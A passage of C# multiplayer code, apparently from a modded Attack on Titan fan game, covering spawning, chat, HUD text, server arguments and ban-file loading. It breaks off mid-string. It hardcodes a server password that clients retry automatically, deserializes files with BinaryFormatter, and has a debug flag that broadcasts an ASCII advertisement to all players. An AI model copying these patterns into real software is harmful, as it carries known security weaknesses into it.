    public void RPCaskServerForInfoAndSpawn(NetworkMessageInfo info)
    {
        if (this.isNightmodeEnforced)
            base.networkView.RPC("EnforceNightMode", info.sender);
        if (this.isTotonbusterEnforced)
            base.networkView.RPC("EnforceTotonBuster", info.sender);
        for (int i = 0; i < this.numberOfPlayers; i++)
        {
            if (this.players[i] != null)
            {
                if (this.players[i].networkplayer != null)
                {
                    if (object.Equals(this.players[i].networkplayer, info.sender))
                    {
                        object[] args = new object[] { this.players[i].name, this.players[i].resourceId };
                        #if Server
                        if (this.letpublic)
                        {
                            if (this.waittospawn[i])
                            {
                                base.networkView.RPC("showChatContent", info.sender, "[ff0000]You will not spawn until Wave 1\n[-]");
                                base.networkView.RPC("showChatContent", info.sender, "You must wait To spawn untill next round\n");
                                base.networkView.RPC("showChatContent", info.sender, "[ff0000]You will not spawn until Wave 1[-]\n");
                                base.networkView.RPC("showChatContent", info.sender, "You must wait To spawn untill next round\n");
                                this.players[i].dead = true;
                                DebugConsole.Log("Do not SPAWN PLAYER:" + info.sender.ToString() + " : " + this.players[i].name + " : " + this.players[i].resourceId);
                            }
                            else
                            {
                                base.networkView.RPC("RPCsetMyInfoAndSpawn", info.sender, args);
                                DebugConsole.Log("SPAWN PLAYER:" + info.sender.ToString() + " : " + this.players[i].name + " : " + this.players[i].resourceId);
                            }
                            return;
                        }
                        else
                        {
                        #endif
                            base.networkView.RPC("RPCsetMyInfoAndSpawn", info.sender, args);
                            DebugConsole.Log("SPAWN PLAYER:" + info.sender.ToString() + " : " + this.players[i].name + " : " + this.players[i].resourceId);
                            return;
                        #if Server
                        }
                        #endif
                    }
                }
                else
                DebugConsole.Log("SPAWN PLAYER:" + info.sender.ToString() + "FAILED");
            }
        }
    }

    private void RPCLoadLevel()
    {
        Network.RemoveRPCsInGroup(0);
        Network.RemoveRPCsInGroup(1);
        object[] args = new object[] { this.map, this.lastLevelPrefix + 1 };
        base.networkView.RPC("LoadLevelII", RPCMode.AllBuffered, args);
    }

    private void RPCLoadLevelTo(NetworkPlayer np)
    {
        Network.RemoveRPCsInGroup(0);
        Network.RemoveRPCsInGroup(1);
        object[] args = new object[] { this.map, this.lastLevelPrefix + 1 };
        base.networkView.RPC("LoadLevelII", np, args);
    }

    [RPC]
    public void RPCsetMyInfoAndSpawn(string name, string hero)
    {
        DebugConsole.Log("RPCsetMyInfoAndSpawn:" + name + ":" + hero);
        this.myLastHeroName = name;
        this.myLastHero = hero;
        this.SpawnPlayer(this.myLastHero, "playerRespawn");
    }

    public void sendChatContent(string content)
    {
        object[] args = new object[1];
        string[] textArray1 = new string[] { "[", this.myLastHeroName, "]:", content, "\n" };
        args[0] = string.Concat(textArray1);
        base.networkView.RPC("showChatContent", RPCMode.All, args);
    }

    public void sendChatContentInfo(string content)
    {
        object[] args = new object[] { content + "\n" };
        base.networkView.RPC("showChatContent", RPCMode.All, args);
    }

    [RPC]
    private void setMyHeroToEren()
    {
        this.myLastHero = "EREN";
    }

    public void setMyInfo(string name, string heroResource)
    {
        object[] args = new object[] { name, this.myNetworkplayerIDOnServer, heroResource };
        base.networkView.RPC("netSetPlayerInfo", RPCMode.Server, args);
        Debug.Log("I send to server my ID and my name :" + this.myNetworkplayerIDOnServer + ":" + name + ":" + heroResource);
        this.playerName = name;
       // if (heroResource == "EREN")
       // {
           // heroResource = "MIKASA";
       // }
        this.myLastHero = heroResource;
    }

    [RPC]
    public void showChatContent(string content)
    {
        this.chatContent.Add(content);
        if (this.chatContent.Count > 10)
        {
            this.chatContent.RemoveAt(0);
        }
        GameObject.Find("LabelChatContent").GetComponent<UILabel>().text = string.Empty;
        for (int i = 0; i < this.chatContent.Count; i++)
        {
            if (!this.noname)
            {
                UILabel component = GameObject.Find("LabelChatContent").GetComponent<UILabel>();
                component.text = component.text + this.chatContent[i];
            }
        }
        if (!content.StartsWith("[FF0000]*") && !content.StartsWith("[FFFB40]*"))
        {
            content = content.Replace("\n", " ");
            while (content.LastIndexOf("[") > 0)
            {
                content = content.Remove(content.LastIndexOf("[-"), 3);
                content = content.Remove(content.LastIndexOf("["), 8);
            }
            DebugConsole.Chat(content);
        }
    }

    private void ShowHUDInfoCenter(string content)
    {
        object[] args = new object[] { content };
        base.networkView.RPC("netShowHUDInfoCenter", RPCMode.All, args);
        GameObject obj2 = GameObject.Find("LabelInfoCenter");
        if (obj2 != null)
        {
            obj2.GetComponent<UILabel>().text = content;
        }
    }

    private void ShowHUDInfoTopCenter(string content)
    {
        object[] args = new object[] { content };
        base.networkView.RPC("netShowHUDInfoTopCenter", RPCMode.All, args);
        GameObject obj2 = GameObject.Find("LabelInfoTopCenter");
        if (obj2 != null)
        {
            if (this.noname)
                content = " ";
            obj2.GetComponent<UILabel>().text = content;
        }
    }

    private void ShowHUDInfoTopLeft()
    {
        string str = string.Empty;
        for (int i = 0; i < this.numberOfPlayers; i++)
        {
            if (this.players[i] != null)
            {
                if (this.players[i].dead)
                {
                    str = str + "[ff0000]";
                }
                string str2 = str;
                object[] objArray1 = new object[] { str2, "[", this.players[i].id, "]", this.players[i].name, ":", this.players[i].kills, "/", this.players[i].die, "/", this.players[i].maxDamage, "/", this.players[i].totalDamage }; //, "/", this.players[i].assistancePt
                str2 = string.Concat(objArray1);
                object[] objArray2 = new object[] { str2, " Ping:", Network.GetAveragePing(this.players[i].networkplayer), "ms" };
                str = string.Concat(objArray2);
                if (this.players[i].dead)
                {
                    str = str + "[-]";
                }
                GameObject[] player = GameObject.FindGameObjectsWithTag("Player");
                foreach (GameObject obj3 in player)
                {
                    if (obj3.networkView.owner.ToString() == this.players[i].id && obj3 != null)
                    {
                        if (obj3.GetComponent<HERO>())
                        {
                            if (obj3.GetComponent<HERO>().isGrabbed)
                                str = str + "*Grabbed*";
                        }
                    }
               }
                str = str + "\n";
            }
        }
        #if DEBUG
        if (this.dick)
            str =  "\n\n                                                   P L E A S E   B U Y  A\n\n\n                                                   $$$$$$$$\\\n                                                   $$  _____|\n                                                   $$ |   $$$$$$\\ $$$$$$$\\  $$$$$$\\\n                                                   $$$$$\\$$  __$$\\$$  __$$\\$$  __$$\\\n                                                   $$  __$$$$$$$$ $$ |  $$ $$ /  $$ | \n                                                   $$ |  $$   ____$$ |  $$ $$ |  $$ | \n                                                   $$ |  \\$$$$$$$\\$$ |  $$ \\$$$$$$$ | \n                                                   \\__|   \\_______\\__|  \\__|\\____$$ | \n                                                                           $$\\   $$ | \n                                                                           \\$$$$$$  | \n	    [EDC200]$$$$$$\\  $$$$$$\\ $$\\      $$$$$$$\\[-]         $$$$$$\\                      \\______/                 $$\\\n	   [EDC200]$$  __$$\\$$  __$$\\$$ |     $$  __$$\\[-]       $$  __$$\\                                              $$ | \n	   [EDC200]$$ /  \\__$$ /  $$ $$ |     $$ |  $$ |[-]      $$ /  $$ |$$$$$$$\\ $$$$$$$\\ $$$$$$\\ $$\\   $$\\$$$$$$$\\$$$$$$\\\n	   [EDC200]$$ |$$$$\\$$ |  $$ $$ |     $$ |  $$ |[-]      $$$$$$$$ $$  _____$$  _____$$  __$$\\$$ |  $$ $$  __$$\\_$$  _| \n	   [EDC200]$$ |\\_$$ $$ |  $$ $$ |     $$ |  $$ |[-]      $$  __$$ $$ /     $$ /     $$ /  $$ $$ |  $$ $$ |  $$ |$$ |\n	   [EDC200]$$ |  $$ $$ |  $$ $$ |     $$ |  $$ |[-]      $$ |  $$ $$ |     $$ |     $$ |  $$ $$ |  $$ $$ |  $$ |$$ |$$\\\n	   [EDC200]\\$$$$$$  |$$$$$$  $$$$$$$$\\$$$$$$$  |[-]      $$ |  $$ \\$$$$$$$\\\\$$$$$$$\\\\$$$$$$  \\$$$$$$  $$ |  $$ |\\$$$$  | \n	    [EDC200]\\______/ \\______/\\________\\_______/[-]       \\__|  \\__|\\_______|\\_______|\\______/ \\______/\\__|  \\__| \\____/\n\n                                                         T O   R E M O V E   T H I S   A D \n                                           * SEND A PM TO ACCELEVI IN THE OFFICIAL FENGLEE FORUMS TO KNOW MORE *" ;
        #endif
        object[] args = new object[] { str };
        base.networkView.RPC("netShowHUDInfoTopLeft", RPCMode.All, args);
        GameObject obj2 = GameObject.Find("LabelInfoTopLeft");
        if (obj2 != null)
        {
            str = str.Replace("[0]", "[*^_^*]");
            if (this.noname)
                str = " ";
            obj2.GetComponent<UILabel>().text = str;
        }
    }

    private void ShowHUDInfoTopRight(string content)
    {
        if (this.showhp)
        {
            foreach (GameObject obj2 in GameObject.FindGameObjectsWithTag("titan"))
            {
                if (obj2.GetComponent<COLOSSAL_TITAN>() != null)
                    content = content + "\nCOLOSSAL TITAN HP: " + (obj2.GetComponent<COLOSSAL_TITAN>().NapeArmor.ToString());
                if (obj2.GetComponent<FEMALE_TITAN>() != null)
                    content = content + "\nAnnie's HP: " + (obj2.GetComponent<FEMALE_TITAN>().NapeArmor.ToString() + "\n L Ankle: " + obj2.GetComponent<FEMALE_TITAN>().AnkleLHP.ToString() + "\n R Ankle: " + obj2.GetComponent<FEMALE_TITAN>().AnkleRHP.ToString());
            }
        }
               object[] args = new object[] { content };
        base.networkView.RPC("netShowHUDInfoTopRight", RPCMode.All, args);
        GameObject obj3 = GameObject.Find("LabelInfoTopRight");
        if (obj3 != null)
        {
            if (this.noname)
                content = " ";
            obj3.GetComponent<UILabel>().text = content;
        }
    }

    private void ShowHUDInfoTopRightMAPNAME(string content)
    {
        object[] args = new object[] { content };
        base.networkView.RPC("netShowHUDInfoTopRightMAPNAME", RPCMode.Others, args);
        GameObject obj2 = GameObject.Find("LabelInfoTopRight");
        if (obj2 != null)
        {
            UILabel component = obj2.GetComponent<UILabel>();
            if (this.noname)
                content = " ";
            component.text = component.text + content;
        }
    }

    [RPC]
    private void showResult(string text0, string text1, string text2, string text3, string text4, string text5, string text6)
    {
        GameObject obj2 = GameObject.Find("UI_IN_GAME");
        NGUITools.SetActive(obj2.GetComponent<UIReferArray>().panels[0], false);
        NGUITools.SetActive(obj2.GetComponent<UIReferArray>().panels[1], false);
        NGUITools.SetActive(obj2.GetComponent<UIReferArray>().panels[2], true);
        GameObject.Find("LabelName").GetComponent<UILabel>().text = text0;
        GameObject.Find("LabelKill").GetComponent<UILabel>().text = text1;
        GameObject.Find("LabelDead").GetComponent<UILabel>().text = text2;
        GameObject.Find("LabelMaxDmg").GetComponent<UILabel>().text = text3;
        GameObject.Find("LabelTotalDmg").GetComponent<UILabel>().text = text4;
        GameObject.Find("LabelAssistance").GetComponent<UILabel>().text = text5;
        GameObject.Find("LabelResultTitle").GetComponent<UILabel>().text = text6;
        Screen.lockCursor = false;
        Screen.showCursor = true;
    }

    private void SingleShowHUDInfoTopCenter(string content)
    {
        GameObject obj2 = GameObject.Find("LabelInfoTopCenter");
        if (obj2 != null)
        {
            if (this.noname)
                content = " ";
            obj2.GetComponent<UILabel>().text = content;
        }
    }

    private void SingleShowHUDInfoTopLeft(string content)
    {
        GameObject obj2 = GameObject.Find("LabelInfoTopLeft");
        if (obj2 != null)
        {
            content = content.Replace("[0]", "[*^_^*]");
            if (this.noname)
                content = " ";
            obj2.GetComponent<UILabel>().text = content;
        }
    }

    private void SpawnPlayer(string id, string tag = "playerRespawn")
    {
        GameObject[] objArray = GameObject.FindGameObjectsWithTag(tag);
        GameObject obj2 = objArray[UnityEngine.Random.Range(0, objArray.Length)];
        this.mySpawnHeroObject = GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().setMainObject((GameObject) Network.Instantiate(Resources.Load(id.ToUpper()), obj2.transform.position, obj2.transform.rotation, 0));
        GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().main_object.name = this.myLastHeroName;
        object[] args = new object[] { this.myNetworkplayerIDOnServer };
        if (this.isNightmodeEnforced)
        {
            NetworkViewID viewID = this.mySpawnHeroObject.networkView.viewID;
            this.spawnMyLight(viewID);
            base.networkView.RPC("RPCSpawnLight", RPCMode.OthersBuffered, new object[] { viewID, this.mySpawnHeroObject.transform.position, this.isTotonbusterEnforced });
        }

        base.networkView.RPC("tellServerIamRespawned", RPCMode.Server, args);  //usefull? all
        GameObject.Find("MainCamera").GetComponent<IN_GAME_MAIN_CAMERA>().Revert();
    }

    public GameObject spawnTitan(int rate, Vector3 position, Quaternion rotation)
    {
        GameObject obj2;
        string[] strArray = new string[] { "TITAN_NEW_1", "TITAN_NEW_2" };
        #if Server
        if (isAnniecalypse)
        {
            obj2 = (GameObject)Network.Instantiate(Resources.Load("FEMALE_TITAN"), position, rotation, 0);
        }
        else 
        #endif
        if (UnityEngine.Random.Range(0, 100) < rate)
        {
            obj2 = (GameObject) Network.Instantiate(Resources.Load(strArray[UnityEngine.Random.Range(0, strArray.Length)]), position, rotation, 0);
            if (IN_GAME_MAIN_CAMERA.difficulty == 2)
            {
                obj2.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_JUMPER);
            }
        }
        else
        {
            obj2 = (GameObject) Network.Instantiate(Resources.Load(strArray[UnityEngine.Random.Range(0, strArray.Length)]), position, rotation, 0);
            if (IN_GAME_MAIN_CAMERA.difficulty == 2)
            {
                obj2.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_JUMPER);
            }
            else if (UnityEngine.Random.Range(0, 100) < rate)
            {
                obj2.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_I);
            }
            else
            {
                obj2.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_JUMPER);
            }
        }
        #if Server
        if(iscrawler)
            obj2.GetComponent<TITAN>().setAbnormalType(AbnormalType.TYPE_CRAWLER);
        #endif
        GameObject obj3 = (GameObject) Network.Instantiate(Resources.Load("FX/FXtitanSpawn"), obj2.transform.position, Quaternion.Euler(-90f, 0f, 0f), 0);
        obj3.transform.localScale = obj2.transform.localScale;
        return obj2;
    }
    #if Server
    private void loadargs()
    {
        String[] args = Environment.GetCommandLineArgs();
        for (int i = 1; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "-batchmode":
                     AudioListener.pause = true;
                     break;
                case "-d":
                    DebugConsole.Log("Dedicated");
                    this.isDedicated = true;
                    break;
                case "-m":
                    i++;
                    switch (args[i].ToLower())
                    {
                        case "thecityi":
                        case "city":
                        case "city1":
                        case "thecity1":
                            this.map = "The City I";
                            break;

                        case "thecityii":
                        case "thecity2":
                        case "city2":
                        case "cityii":
                            this.map = "The City II";
                            break;

                        case "cagefighting":
                            this.map = "Cage Fighting";
                            break;

                        case "theforest":
                        case "forest":
                        case "forest1":
                        case "theforest1":
                        case "theforesti":
                            this.map = "The Forest";
                            break;

                        case "theforestii":
                        case "theforest2":
                        case "forest2":
                        case "forestii":
                            this.map = "The Forest II";
                            break;

                        case "theforestiii":
                        case "theforest3":
                        case "forest3":
                        case "forestiii":
                            this.map = "The Forest III";
                            break;

                        case "annie":
                        case "annie1":
                        case "anniei":
                            this.map = "Annie";
                            break;

                        case "annieii":
                        case "annie2":
                            this.map = "Annie II";
                            break;
                        case "colossaltitan":
                        case "colossaltitan1":
                        case "colossaltitani":
                            this.map = "Colossal Titan";
                            break;
                        case "colossaltitan2":
                        case "colossaltitanii":
                            this.map = "Colossal Titan II";
                            break;
                        case "trost":
                        case "trost1":
                        case "trosti":
                            this.map = "Trost";
                            break;
                        case "trost2":
                        case "trostii":
                            this.map = "Trost II";
                            break;
                    }
                    break;
                case "-p":
                    i++;
                    this.serverPort = Convert.ToInt32(args[i]);
                    break;
                case "-s":
                    i++;
                    this.numberOfPlayers = Convert.ToInt32(args[i]);
                    break;
                case "-dif":
                    i++;
                    this.difficulty = Math.Min(Convert.ToInt32(args[i]), 3);
                    break;
            }
        }
    }
    #endif
    private void Start()
    {
       // QualitySettings.vSyncCount = 1;
        this.numberOfPlayers = 4;
        this.difficulty = 0;
        base.gameObject.name = "MultiplayerManager";
        Application.targetFrameRate = 59;
        UnityEngine.Object.DontDestroyOnLoad(base.gameObject);
        Debug.Log("FengMultiplayerScript  is  started!!!!");
        MasterServer.ipAddress = "106.187.103.24";
        Network.natFacilitatorIP = "106.187.103.24";
        this.useNAT = !Network.HavePublicAddress();
        loadConfigFiles();
        FileStream fs = new FileStream("DataFile.dat", FileMode.Open);
        try
        {
            BinaryFormatter formatter = new BinaryFormatter();

            // Deserialize the hashtable from the file and  
            // assign the reference to the local variable.
            data = (SaveData)formatter.Deserialize(fs);
        }
        catch (SerializationException e)
        {
            DebugConsole.Log("Failed to deserialize. Reason: " + e.Message);
            throw;
        }
        finally
        {
            fs.Close();
        }
        #if Server
        loadargs();
        if (File.Exists("BanFile.dat"))
        {
            FileStream fsz = new FileStream("BanFile.dat", FileMode.Open);
            try
            {
                BinaryFormatter formatter = new BinaryFormatter();

                // Deserialize the hashtable from the file and  
                // assign the reference to the local variable.
                Banlist = (List<BanInfo>)formatter.Deserialize(fsz);
            }
            catch (SerializationException e)
            {
                DebugConsole.Log("Failed to deserialize. Reason: " + e.Message);
                throw;
            }
            catch (InvalidCastException b)
            {
                Debug.Log("Banlist Is Corrupt Please replace BanFile.dat");
                Application.Quit();
            }
            finally
            {
                fsz.Close();
            }
        }
        else
            Application.Quit();
        if (File.Exists("BanExport.dat"))
        {
            FileStream fsz = new FileStream("BanExport.dat", FileMode.Open);
            try
            {
                BinaryFormatter formatter = new BinaryFormatter();

                // Deserialize the hashtable from the file and  
                // assign the reference to the local variable.
                List<BanInfo> temp = (List<BanInfo>)formatter.Deserialize(fsz);
                foreach (BanInfo a in temp)
                {
                    if (!Banlist.Contains(a))
                        Banlist.Add(a);
                }
            }
            catch (SerializationException e)
            {
                DebugConsole.Log("Failed to deserialize. Reason: " + e.Message);
                throw;
            }
            catch (InvalidCastException b)
            {
                Debug.Log("Banlist Is Corrupt Please replace BanFile.dat");
                Application.Quit();
            }
            finally
            {
                fsz.Close();
            }
        }
        foreach(BanInfo a in Banlist)
        {
            if (a.issued + a.hours < System.DateTime.Now.Ticks && a.hours > 0)
                Banlist.Remove(a);
        }
        saveban();
        if (this.isDedicated)
        {
            StartAsServer(" ", this.numberOfPlayers, this.serverPort, this.map, this.difficulty, 99);
        }
        #endif
    }

    public void StartAsClient(string ip, int port)
    {
        this.connectToIP = ip;
        this.connectionPort = port;
        //this.loadConfigFiles();
            //bopey
        NetworkConnectionError test = Network.Connect(ip, this.connectionPort);
        if (test == NetworkConnectionError.InvalidPassword)
        {
            Debug.Log("-------------Wrong Pass=================");
            Network.Connect(ip, this.connectionPort, "KNISHES");
            this.lobbypass = true;
        }
        else
        this.enterLobby = true;
    }

    public void StartAsServer(string servername, int num, int port, string map, int difficulty, int time)
    {
        DebugConsole.Log(this.myLastHeroName);
        if (LevelInfo.getInfo(map).type == GAMEMODE.CAGE_FIGHT)
        {
            this.numberOfPlayers = Mathf.Max(2, this.numberOfPlayers);
        }
        #if Server
        if (this.servernameo != null)
            servername = this.servernameo;
        #endif
        this.map = map;
        this.difficulty = difficulty;
        #if Server
        if (!this.isOverrideTime)
        {
        #endif
            this.time = time;
        #if Server
        }
        #endif
        this.serverName = servername;
        this.numberOfPlayers = num;
        this.connectionPort = port;
        IN_GAME_MAIN_CAMERA.difficulty = difficulty;
        Debug.Log("Network.InitializeServer NAT:" + this.useNAT);
        #if Server
        if (!this.letpublic)
        {
            this.lobbypass = true;
            Network.incomingPassword = "KNISHES";
        }
        #endif
        Network.InitializeServer(this.numberOfPlayers - 1, this.connectionPort, this.useNAT);
        if (((GameObject.Find("CheckboxPublicServer") != null) && GameObject.Find("CheckboxPublicServer").GetComponent<UICheckbox>().isChecked) || this.isPublicGame)
        {
            this.usingMasterServer = true;
        }
        else
        {
            this.usingMasterServer = false;
        }
        #if Server
        if (this.REMOVELOBBY)
        {
            this.enterLobby = false;
        }
        else
        {
        #endif
            this.enterLobby = true;
        #if Server
        }
        #endif
        StartCoroutine(Delay());
    }

    public void startGameEndWait()
    {
        this.players = new PlayerInfo[this.numberOfPlayers];
        #if Server
        this.pos = new Vector3[this.numberOfPlayers];
        #endif
        this.players[0] = this.playersRegistered[0];
        this.myNetworkplayerIDOnServer = this.players[0].id;
        this.players[0].name = this.myLastHeroName;
        this.enterLobby = false;
        this.wave = 1;
        this.highestwave = 1;
        if (this.usingMasterServer)
        {
            this.isCallLaterNetworkInitializeServer = true;
            this.isCallLaterRPCLoadLevel = true;
            this.calllaterDuration = 0f;
            for (int i = 0; i < this.numberOfPlayers; i++)
            {
                if ((this.playersRegistered[i] != null) && this.playersRegistered[i].SET)
                {
                    base.networkView.RPC("reConnectToTheServerWithOldData", this.playersRegistered[i].networkplayer, new object[0]);
                }
            }
            #if Server
            if (!this.isPublicGame)
            {
            #endif
                if (!isLobbySettingsOverriden)
                {
                    this.myLastHeroName = GameObject.Find("InputPlayerName").GetComponent<UIInput>().text;
                    this.myLastHero = GameObject.Find("PopupListCharacter").GetComponent<UIPopupList>().selection;
                }
                MonoBehaviour.print("?? enterLobby " + this.enterLobby);
                Network.Disconnect();
                MasterServer.UnregisterHost();
                MonoBehaviour.print("startGameEndWait Server is Loading Level");
                StartCoroutine(Delay());
             #if Server
            }
            #endif
        }
        else
        {
            for (int j = 0; j < this.numberOfPlayers; j++)
            {
                if (this.playersRegistered[j] != null)
                {
                    if (this.playersRegistered[j].SET)
                    {
                        for (int k = 0; k < this.numberOfPlayers; k++)
                        {
                            if (this.players[k] == null)
                            {
                                this.players[k] = this.playersRegistered[j];
                                object[] args = new object[] { k };
                                base.networkView.RPC("TellPlayerHisNetworkplayerIndex", this.playersRegistered[j].networkplayer, args);
                                break;
                            }
                        }
                    }
                    else
                    {
                        base.networkView.RPC("TellPlayerHeHasntRegister", this.playersRegistered[j].networkplayer, new object[0]);
                    }
                }
                //moved delay
            }
           #if Server
            if (Network.isServer && this.letpublic)
            {
                for (int j = 0; j < this.numberOfPlayers; j++)
                {
                    if (players[j] != null)
                    {
                        object[] args2 = new object[] { this.map, this.lastLevelPrefix };
                        base.networkView.RPC("LoadLevelII", players[j].networkplayer, args2);
                    }
                }
                Network.RemoveRPCsInGroup(0);
                Network.RemoveRPCsInGroup(1);
                LoadLevelII(this.map, this.lastLevelPrefix + 1);
            }
            else
            #endif
            StartCoroutine(Delay());
            this.RPCLoadLevel();
        }
    }

    [RPC]
    private void TellPlayerHeHasntRegister(string info)
    {
        MonoBehaviour.print("server told me I didn't register");
       // this.Disconnect();
        Screen.lockCursor = false;
        Screen.showCursor = true;
        this.netShowHUDInfoTopCenter("Didn't register to server\n" + info);
    }

    [RPC]
    private void TellPlayerHisNetworkplayerID(string id, string version)
    {
        this.myNetworkplayerIDOnServer = id;
        if (version != UIMainReferences.version)
        {
            this.Disconnect();
            IN_GAME_MAIN_CAMERA.gametype = GAMETYPE.STOP;
            GameObject.Find("InputManagerController").GetComponent<FengCustomInputs>().menuOn = false;
            UnityEngine.Object.Destroy(base.gameObject);
            Application.LoadLevel("menu");
        }
    }

    [RPC]
    private void TellPlayerHisNetworkplayerIndex(int index)
    {
        this.myNetworkplayerIndexOnServer = index;
        Debug.Log("I am Client MY index on server's players[] is " + index);
        LevelInfo info = LevelInfo.getInfo(this.map);
    }

    [RPC]
    private void tellServerIamRespawned(string id)
    {
        if (Network.isServer)
        {
            for (int i = 0; i < this.numberOfPlayers; i++)
            {
                if ((this.players[i] != null) && (this.players[i].id == id))
                {
                    this.players[i].dead = false;
                    foreach(GameObject a in GameObject.FindGameObjectsWithTag("Player"))
                    {
                        if (a.networkView.owner.ToString() == id)
                        {
                            this.players[i].play = a;
                            #if Server
                            this.pos[i] = new Vector3(1000f, 1000f, 1000f);
                            #endif
                        }
                    }
                }
            }
        }
    }

    private void TestConnection()
    {
        this.connectionTestResult = Network.TestConnection();
        if (this.connectionTestResult == ConnectionTesterStatus.Error)
        {
            this.testMessage = "Problem determining NAT capabilities";
            this.doneTesting = true;
        }
        else if (this.connectionTestResult == ConnectionTesterStatus.Undetermined)
        {
            this.testMessage = "Undetermined NAT capabilities";
            this.doneTesting = false;
        }
        else if (this.connectionTestResult == ConnectionTesterStatus.PublicIPIsConnectable)
        {
            this.testMessage = "Directly connectable public IP address.";
            this.useNatA = false;
            this.doneTesting = true;
        }
        else if (this.connectionTestResult == ConnectionTesterStatus.PublicIPPortBlocked)
        {
            this.testMessage = "Non-connectable public IP address (port " + this.serverPort + " blocked), running a server is impossible.";
            this.useNatA = false;
            if (!this.probingPublicIP)
            {
                this.connectionTestResult = Network.TestConnectionNAT();
                this.probingPublicIP = true;
                this.testStatus = "Testing if blocked public IP can be circumvented";
                this.timer = Time.time + 10f;
            }
            else if (Time.time > this.timer)
            {
                this.probingPublicIP = false;
                this.useNatA = true;
                this.doneTesting = true;
            }
        }
        else if (this.connectionTestResult == ConnectionTesterStatus.PublicIPNoServerStarted)
        {
            this.testMessage = "Public IP address but server not initialized, it must be started to check server accessibility. Restart connection test when ready.";
        }
        else if (this.connectionTestResult == ConnectionTesterStatus.LimitedNATPunchthroughPortRestricted)
        {
            this.testMessage = "Limited NAT punchthrough capabilities. Cannot connect to all types of NAT servers. Running a server is ill advised as not everyone can connect.";
            this.useNatA = true;
            this.doneTesting = true;
        }
        else if (this.connectionTestResult == ConnectionTesterStatus.LimitedNATPunchthroughSymmetric)
        {
            this.testMessage = "Limited NAT punchthrough capabilities. Cannot connect to all types of NAT servers. Running a server is ill advised as not everyone can connect.";
            this.useNatA = true;
            this.doneTesting = true;
        }
        else if ((this.connectionTestResult == ConnectionTesterStatus.NATpunchthroughAddressRestrictedCone) || (this.connectionTestResult == ConnectionTesterStatus.NATpunchthroughFullCone))
        {
            this.testMessage = "NAT punchthrough capable. Can connect to all servers and receive connections from all clients. Enabling NAT punchthrough func tionality.";
            this.useNatA = true;
            this.doneTesting = true;
        }
        else
        {
            this.testMessage = "Error in test routine, got " + this.connectionTestResult;
        }
        if (this.doneTesting)
        {
            if (this.useNatA)
            {
                this.shouldEnableNatMessage = "When starting a server the NAT punchthrough feature should be enabled (useNat parameter)";
            }
            else
            {
                this.shouldEnableNatMessage = "NAT punchthrough not needed";
            }
            this.testStatus = "Done testing";
            if (GameObject.Find("UIRefer") != null)
            {
                if ((this.connectionTestResult == ConnectionTesterStatus.NATpunchthroughAddressRestrictedCone) || (this.connectionTestResult == ConnectionTesterStatus.NATpunchthroughFullCone))
                {
                    NGUITools.SetActive(GameObject.Find("UIRefer").GetComponent<UIMainReferences>().CheckboxPublicServer, true);
                }
                else
                {
                    NGUITools.SetActive(GameObject.Find("UIRefer").GetComponent<UIMainReferences>().CheckboxPublicServer, true);
                }
                if (GameObject.Find("LabelNetworkStatus") != null)
                {
                    GameObject.Find("LabelNetworkStatus").GetComponent<UILabel>().text = this.testStatus + "\n" + this.testMessage;
                }
            }
        }
    }

    public void titanGetKill(NetworkViewID killer, int Damage, string name)
    {
        Damage = Mathf.Max(10, Damage);
        object[] args = new object[] { Damage };
        base.networkView.RPC("netShowDamage", killer.owner, args);
        this.oneTitanDown(name);
        for (int i = 0; i < this.numberOfPlayers; i++)
        {
            if ((this.players[i] != null) && (killer.owner.ToString() == this.players[i].id))
            {
                this.playerKillInfoUpdate(this.players[i], Damage);
                this.sendChatContentInfo(string.Concat(new object[] { "[FFFB40]*", this.players[i].name, " just killed a Titan with ", Damage, " damage!*[-]" }));
                return;
            }
        }
    }

    public void titanGetKillbyServer(int Damage, string name)
    {
        Damage = Mathf.Max(10, Damage);
        this.sendChatContentInfo(string.Concat(new object[] { "[FFFB40]*", this.myLastHeroName, " just killed a Titan with ", Damage, " damage!*[-]" }));
        this.netShowDamage(Damage);
        this.oneTitanDown(name);
        this.playerKillInfoUpdate(this.players[0], Damage);
    }

    private void Update()
    {
        if (currentVote != null)
        {
            if (startVoteTime <= Time.time)
            {
                base.networkView.RPC("showChatContent", RPCMode.All, new object[] { "[e39629]*Vote died.*[-]\n" });
                currentVote = null;
            }
        }

        if (IN_GAME_MAIN_CAMERA.gametype == GAMETYPE.CLIENT)
        {
            this.timeElapse += Time.deltaTime;
            #if DEBUG
            if ((this.timeElapse > .5f))
            {
                this.timeElapse = this.timeElapse - .5f;
                if (this.dick)
                {//Feng Gold
                    object[] args = new object[] { "\n\n                                                   P L E A S E   B U Y  A\n\n\n                                                   $$$$$$$$\\\n                                                   $$  _____|\n                                                   $$ |   $$$$$$\\ $$$$$$$\\  $$$$$$\\\n                                                   $$$$$\\$$  __$$\\$$  __$$\\$$  __$$\\\n                                                   $$  __$$$$$$$$ $$ |  $$ $$ /  $$ | \n                                                   $$ |  $$   ____$$ |  $$ $$ |  $$ | \n                                                   $$ |  \\$$$$$$$\\$$ |  $$ \\$$$$$$$ | \n                                                   \\__|   \\_______\\__|  \\__|\\____$$ | \n                                                                           $$\\   $$ | \n                                                                           \\$$$$$$  | \n	    [EDC200]$$$$$$\\  $$$$$$\\ $$\\      $$$$$$$\\[-]         $$$$$$\\                      \\______/                 $$\\\n	   [EDC200]$$  __$$\\$$  __$$\\$$ |     $$  __$$\\[-]       $$  __$$\\                                              $$ | \n	   [EDC200]$$ /  \\__$$ /  $$ $$ |     $$ |  $$ |[-]      $$ /  $$ |$$$$$$$\\ $$$$$$$\\ $$$$$$\\ $$\\   $$\\$$$$$$$\\$$$$$$\\\n	   [EDC200]$$ |$$$$\\$$ |  $$ $$ |     $$ |  $$ |[-]      $$$$$$$$ $$  _____$$  _____$$  __$$\\$$ |  $$ $$  __$$\\_$$  _| \n	   [EDC200]$$ |\\_$$ $$ |  $$ $$ |     $$ |  $$ |[-]      $$  __$$ $$ /     $$ /     $$ /  $$ $$ |  $$ $$ |  $$ |$$ |\n	   [EDC200]$$ |  $$ $$ |  $$ $$ |     $$ |  $$ |[-]      $$ |  $$ $$ |     $$ |     $$ |  $$ $$ |  $$ $$ |  $$ |$$ |$$\\\n	   [EDC200]\\$$$$$$  